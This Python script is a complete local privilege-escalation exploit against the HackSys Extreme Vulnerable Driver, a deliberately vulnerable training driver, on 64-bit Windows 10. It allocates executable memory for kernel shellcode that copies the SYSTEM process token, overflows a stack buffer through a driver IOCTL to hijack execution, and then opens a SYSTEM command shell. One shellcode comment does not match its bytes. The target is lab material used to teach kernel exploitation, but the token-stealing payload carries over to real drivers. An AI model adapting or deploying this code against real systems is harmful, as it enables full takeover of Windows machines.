from ctypes import *
from ctypes import wintypes as w
from struct import pack
from os import system

INVALID_HANDLE_VALUE  = 0xFFFFFFFFFFFFFFFF

GENERIC_READ          = 0x80000000
GENERIC_WRITE         = 0x40000000

FILE_FLAG_OVERLAPPED  = 0x40000000
FILE_ATTRIBUTE_NORMAL = 0x80
FILE_SHARE_READ       = 0x00000001
FILE_SHARE_WRITE      = 0x00000002

OPEN_EXISTING         = 0x3

MEM_COMMIT  = 0x00001000
MEM_RESERVE = 0x00002000

PAGE_EXECUTE_READWRITE = 0x40

IOCTL       = 0x222003 # BUFFER_OVERFLOW_STACK
BUFFER_SIZE = 0x800

Driver = b"\\\\.\\HackSysExtremeVulnerableDriver"

DeviceIOControl = windll.Kernel32.DeviceIoControl
CreateFileA     = windll.Kernel32.CreateFileA
VirtualAlloc    = windll.Kernel32.VirtualAlloc

DeviceIOControl.argtypes = w.HANDLE, w.DWORD, c_void_p, w.DWORD, c_void_p, w.DWORD, POINTER(w.DWORD), c_void_p
DeviceIOControl.restype  = w.BOOL

CreateFileA.argtypes = w.LPCSTR, w.DWORD, w.DWORD, c_void_p, w.DWORD, w.DWORD, w.HANDLE
CreateFileA.restype = w.HANDLE

VirtualAlloc.argtypes = c_void_p, c_size_t, w.DWORD, w.DWORD
VirtualAlloc.restype = c_void_p

print("\nHEVD 3.00 STACK_BUFFER_OVERFLOW x64 Windows 10 22H2 (NO SMEP) - Slimicide\n")

hDriver = CreateFileA(Driver, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, None)

if(hDriver == INVALID_HANDLE_VALUE):
    print(f"[!] Failed to open a handle to {Driver.decode()}")
    exit(-1)

print("[+] Targeting STACK_BUFFER_OVERFLOW (IOCTL: 0x222003)")
print(f"[+] Handle opened to {Driver.decode()} at {hDriver}")

# Original Shellcode Credit - Connor McGarr
# https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/
# Modified to fix current offsets and instructions

shellcode = b""
shellcode += b"\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              # mov rax,[gs:0x188]  ; Current thread (KTHREAD)
shellcode += b"\x48\x8B\x80\xB8\x00\x00\x00"                      # mov rax,[rax+0xb8]  ; Current process (EPROCESS)
shellcode += b"\x48\x89\xC3"                                      # mov rbx,rax         ; Copy current process to rbx
shellcode += b"\x48\x8B\x9B\x48\x04\x00\x00"                      # mov rbx,[rbx+0x448] ; ActiveProcessLinks
shellcode += b"\x48\x81\xEB\x48\x04\x00\x00"                      # sub rbx,0x448       ; Go back to current process
shellcode += b"\x48\x8B\x8B\x40\x04\x00\x00"                      # mov rcx,[rbx+0x440] ; UniqueProcessId (PID)
shellcode += b"\x48\x83\xF9\x04"                                  # cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
shellcode += b"\x75\xE5"                                          # jnz 0x13            ; Loop until SYSTEM PID is found
shellcode += b"\x48\x8B\x8B\xb8\x04\x00\x00"                      # mov rcx,[rbx+0x4b8] ; SYSTEM token is @ offset _EPROCESS + 0x4b8
shellcode += b"\x80\xE1\xF0"                                      # and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
shellcode += b"\x48\x89\x88\xb8\x04\x00\x00"                      # mov [rax+0x358],rcx ; Copy SYSTEM token to current process
shellcode += b"\x48\x83\xC4\x28"                                  # add rsp, 0x28       ; RESTORE (Specific to HEVD)
shellcode += b"\x4D\x33\xE4"                                      # xor r12, r12        ; r12 gets clobbered, should be 0
shellcode += b"\x4D\x33\xFF"                                      # xor r15, r15        ; r15 gets clobbered, should be 0
shellcode += b"\xC3"                                              # ret                 ; Done!

shellcode_address = VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
if not shellcode_address:
    print("[!] Failed to allocate memory for shellcode")
    exit(-1)
print("[+] RWX segment allocated at", hex(shellcode_address))

memmove(shellcode_address, shellcode, len(shellcode))
print("[+] Shellcode written to allocated segment")

EXPLOIT_BUFFER = b"A" * BUFFER_SIZE
EXPLOIT_BUFFER += b"B" * 0x18
EXPLOIT_BUFFER += pack("<Q", shellcode_address) # RIP Overwrite

dwBytesReturned = w.DWORD(0)

print(f"[+] Sending overloaded buffer to {Driver.decode()}")
if(DeviceIOControl(hDriver, w.DWORD(IOCTL), EXPLOIT_BUFFER, len(EXPLOIT_BUFFER), None, 0, byref(dwBytesReturned), None) == 0):
    print("[!] DeviceIOControl call failed.")

print("[+] Prepare for NT AUTHORITY\SYSTEM\n")
system("cmd.exe")